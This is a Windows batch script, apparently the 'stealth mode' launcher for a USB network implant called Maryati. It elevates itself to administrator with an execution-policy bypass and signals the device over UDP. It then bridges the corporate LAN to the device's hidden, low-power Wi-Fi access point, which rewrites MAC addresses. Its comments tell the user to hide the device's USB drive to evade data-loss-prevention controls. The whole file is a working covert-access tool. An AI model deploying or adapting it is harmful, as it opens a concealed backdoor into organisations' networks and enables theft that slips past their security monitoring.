@echo off
setlocal EnableExtensions EnableDelayedExpansion
title Maryati Bridge - Mode 2 Enterprise Stealth (Admin)

rem ---------------------------------------------------------------
rem  Start_Stealth.bat
rem  Mode 2: L2 bridge + MAC NAT + hidden SSID + TX power rendah +
rem  PMF wajib. Set enable_msc=0 di config.txt untuk menyembunyikan
rem  drive USB (bypass DLP) sebelum menjalankan script ini.
rem  Mengirim CMD:MODE=2:<LAN_IP> ke 192.168.33.1:33333.
rem ---------------------------------------------------------------

net session >nul 2>&1
if errorlevel 1 (
    echo [*] Meminta hak Administrator...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
    exit /b
)

set "ESP_IP=192.168.33.1"
set "ESP_PORT=33333"

set "USB_IF="
for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "(Get-NetAdapter -IncludeHidden | Where-Object { $_.InterfaceDescription -match 'Maryati|NCM' -or $_.MacAddress -like '0B-DA-81-52-*' } | Select-Object -First 1 -ExpandProperty Name)"`) do set "USB_IF=%%A"
if not defined USB_IF (
    echo [!] Adapter USB Maryati tidak ditemukan.
    pause
    exit /b 1
)

set "LAN_IF="
for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1).InterfaceAlias"`) do set "LAN_IF=%%A"
if not defined LAN_IF (
    echo [!] Tidak ada adapter LAN dengan default route.
    pause
    exit /b 1
)

set "LAN_IP="
for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "(Get-NetIPAddress -InterfaceAlias '%LAN_IF%' -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.254.*' } | Select-Object -First 1).IPAddress"`) do set "LAN_IP=%%A"
if not defined LAN_IP (
    echo [!] Adapter LAN '%LAN_IF%' tidak punya alamat IPv4.
    pause
    exit /b 1
)

echo [*] LAN : %LAN_IF%  (%LAN_IP%)
echo [*] USB : %USB_IF%
echo [*] Mengaktifkan Mode 2 (Stealth) via CMD:MODE=2:%LAN_IP% ...
powershell -NoProfile -Command "$u = New-Object System.Net.Sockets.UdpClient; $b = [Text.Encoding]::ASCII.GetBytes('CMD:MODE=2:%LAN_IP%'); [void]$u.Send($b, $b.Length, '%ESP_IP%', %ESP_PORT%); $u.Close()"
if errorlevel 1 echo [!] Paket kontrol gagal dikirim (firewall?). Lanjut membuat bridge.

echo [*] Membuat Network Bridge (L2)...
netsh bridge install >nul 2>&1
netsh bridge add adapter "%LAN_IF%" >nul 2>&1
netsh bridge add adapter "%USB_IF%" >nul 2>&1
netsh bridge show adapter

echo.
echo [+] Mode 2 aktif: SSID hidden, TX power ~8 dBm, PMF required,
echo     source MAC klien di-rewrite ke custom_mac.
echo     Jika drive USB tidak terlihat: itu normal (enable_msc=0).
echo.
pause
